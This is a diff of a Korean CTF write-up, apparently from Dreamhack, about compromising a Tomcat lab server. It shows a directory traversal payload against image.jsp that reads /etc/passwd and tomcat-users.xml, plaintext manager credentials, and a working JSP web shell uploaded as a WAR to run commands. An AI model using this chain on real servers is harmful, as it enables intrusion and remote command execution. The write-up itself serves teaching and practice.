@@ -16,7 +16,10 @@ tags:
 이미지가 있으니 들어가보자.
 
 다음과 같은 경로가 열린다
-```/image.jsp?file=working.png```
+
+```
+/image.jsp?file=working.png
+```
 
 왠지 내부 파일 포함(LFI) 취약점이 될거같다. 파일 파라미터에 ../../../../../etc/passwd를 넣어 디렉토리 트레버설이 되는 지 보자
 
@@ -27,6 +30,7 @@ tags:
 ../../../conf/tomcat-users.xml
 
 로 들어가면 톰캣 설정파일과 id, pw을 찾을 수 있따. 
+
 ```
 <?xml version="1.0" encoding="UTF-8"?>
 <tomcat-users xmlns="http://tomcat.apache.org/xml"
@@ -43,6 +47,7 @@ tags:
     <user username="tomcat" password="P2assw0rd_4_t0mC2tM2nag3r31337" roles="manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script" />  
 </tomcat-users>
 ```
+
 이제 /manager에 들어가면 로그인 창이 나오고, 위에서 얻은 정보로 로그인하면 아파치 서버 기본 매니저 페이지가 나온다. 
 
 이 중에서 눈여겨 봐야할 곳은 war 파일을 업로드하는 곳이다.
@@ -50,9 +55,11 @@ tags:
 여기에 war 파일을 올리면 안에 있는 파일이 바로 서버로 업로드 되므로 웹쉘을 올려볼 수 있다.
 
 아래 페이로드를 jsp로 저장한뒤 압축하여 업로드한다
+
 ```
 <% out.println(new java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next()); %>
 ```
+
 접근 후 cmd 파라미터로 명령어를 날리면 명령을 실행할 수 있고, /flag를 실행시키면 바로 플래그를 얻을 수 있다.
 
 ![image.png](https://dreamhack-media.s3.amazonaws.com/attachments/d7824a76e9fae691bbb567cb4360929b97b5a4c834e92166d0ceb380f9cdd6a2.png)
